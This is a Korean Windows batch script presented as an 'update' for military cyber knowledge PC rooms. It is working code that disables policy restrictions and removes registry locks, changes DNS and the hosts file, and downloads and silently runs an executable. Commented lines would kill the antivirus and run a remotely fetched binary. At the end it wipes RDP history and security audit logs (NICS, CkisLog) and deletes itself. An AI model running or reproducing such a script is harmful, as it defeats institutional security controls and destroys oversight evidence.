@ECHO OFF

CLS
MODE.COM CON COLS=98 LINES=30 >NUL 2>NUL
COLOR 1F
SET "TITLE=★"
TITLE %TITLE% 2>NUL

SET "FILONE=사이버지"
SET "FILTWO=식정보방 업데이트"
SET "FILVER=2.0"
SET "FILREV=180816"

SET NLM=^
SET NL=^^^%NLM%%NLM%^%NLM%%NLM%

ECHO.
ECHO.
ECHO ────────────────────────────────────────────────
ECHO.
ECHO                               %FILONE%%FILTWO% v%FILVER%-%FILREV%
ECHO                                        https://mil.harold.kim/
ECHO.
ECHO       ⓘ 알림
ECHO       해당 프로그램을 사용하여 발생할 수 있는 일에 대한 책임은 전부 사용자에게 있습니다.
ECHO.
ECHO ────────────────────────────────────────────────
ECHO.
ECHO ◈ 보안상 제한된 일부 기능을 제거합니다. (최대 1분)
TASKKILL /f /im explorer.exe >NUL 2>NUL
ECHO Option Explicit > %temp%\a.vbs
ECHO Dim styles, WSHShell, regs >> %temp%\a.vbs
ECHO Set WSHShell = WSCRIPT.CreateObject("WSCRIPT.Shell") >> %temp%\a.vbs
ECHO regs = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools" >> %temp%\a.vbs
ECHO styles = "REG_DWORD" >> %temp%\a.vbs
ECHO WSHShell.RegWrite regs, "0", styles  >> %temp%\a.vbs
ECHO regs = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" >> %temp%\a.vbs
ECHO styles = "REG_DWORD" >> %temp%\a.vbs
ECHO WSHShell.RegWrite regs, "0", styles >> %temp%\a.vbs
WSCRIPT %temp%\a.vbs
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /f >NUL 2>NUL
REG DELETE HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /f >NUL 2>NUL
REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /f >NUL 2>NUL
DEL /f /q /a %temp%\a.vbs
TASKKILL /f /im explorer* >NUL 2>NUL

REM 알약 영구 제거 (보안상 제거함)
REM TASKKILL /f /im AY* >NUL 2>NUL
REM bitsadmin /transfer uz9 /download /priority foreground "https://b.stypr.com/static/download/s.e" C:\uz.9 > NUL
REM move C:\uz.9 C:\secure.exe > NUL
REM C:\secure.exe >NUL
REM START explorer.exe
REM DEL /f /q /a C:\secure.exe >NUL 2>NUL
START explorer.exe

ECHO ◈ 비규칙적인 연결 오류를 해제합니다. (최대 1분)
netsh interface ip add dns "로컬 영역 연결" 8.8.8.8 INDEX=1 >NUL
netsh interface ip add dns "로컬 영역 연결" 208.67.222.222 INDEX=2 >NUL
(
__FUCK__
)>> C:\Windows\System32\drivers\etc\hosts

ECHO ◇ 이제 접속이 원활하게 가능합니다.
ECHO ◈ 크롬 업데이트를 시작합니다. (최대 2분)
ECHO ◇ 업데이트를 위해 실행 중이던 크롬을 종료합니다.
tskill chrome >NUL 2>NUL
TASKKILL /IM chrome.exe >NUL 2>NUL
ECHO ◇ 크롬 설치 파일 다운로드 중..

REM bitsadmin /transfer chrome /download /priority foreground %_CHROME_% C:\patch.zip >NUL 2>NUL
REM bitsadmin /transfer uz1 /download /priority foreground "https://mil.harold.kim/files/u.1" C:\uz.1 >NUL 2>NUL
REM bitsadmin /transfer uz2 /download /priority foreground "https://mil.harold.kim/files/u.2" C:\uz.2 >NUL 2>NUL
REM move C:\uz.1 C:\unzip.exe >NUL 2>NUL
REM move C:\uz.2 C:\unzip32.dll >NUL 2>NUL

bitsadmin /transfer chrome /download /priority foreground "__CHROME__" C:\setup.exe >NUL 2>NUL
ECHO ◇ 크롬 무인 설치 시작! 잠시만 기다려주세요.
REM C:\unzip.exe C:\patch.zip -d C:\patch >NUL 2>NUL
REM C:\patch\setup.exe >NUL 2>NUL
C:\setup.exe >NUL 2>NUL
ECHO ◇ 크롬 설치가 완료되었습니다. 곧 시작합니다.
START chrome --restore-last-session
ECHO ◈ 보안상 모든 내용을 전부 제거합니다. (최대 30초)
DEL /f /q /a C:\unzip.exe >NUL 2>NUL
DEL /f /q /a C:\unzip32.dll >NUL 2>NUL
DEL /f /q /a C:\patch.zip >NUL 2>NUL
DEL /f /q /a C:\patch >NUL 2>NUL
DEL /a /f /q "%USERPROFILE%\My Documents\*.rdp" >NUL 2>NUL
DEL /a /f /q "%USERPROFILE%\Documents\*.rdp" >NUL 2>NUL
REG DELETE "HKCU\Software\Microsoft\Terminal Server Client" /f >NUL 2>NUL
reg add "HKCU\Software\Microsoft\Terminal Server Client" /f >NUL 2>NUL
START /w "" subst X: D:\nics >NUL 2>NUL
START /w "" subst Y: C:\windows >NUL 2>NUL
move /Y X:\log\* %temp% >NUL 2>NUL
move /Y Y:\nics\log\* %temp% >NUL 2>NUL
DEL /f /q /a D:\CkisLog\* >NUL 2>NUL
START /w "" subst X: /D >NUL 2>NUL
START /w "" subst Y: /D >NUL 2>NUL
:DONE
ECHO ◈ 설치가 완료되었습니다. 수고하셨습니다.
timeout 5 >NUL 2>NUL
(goto) 2>nul & DEL "%~f0"
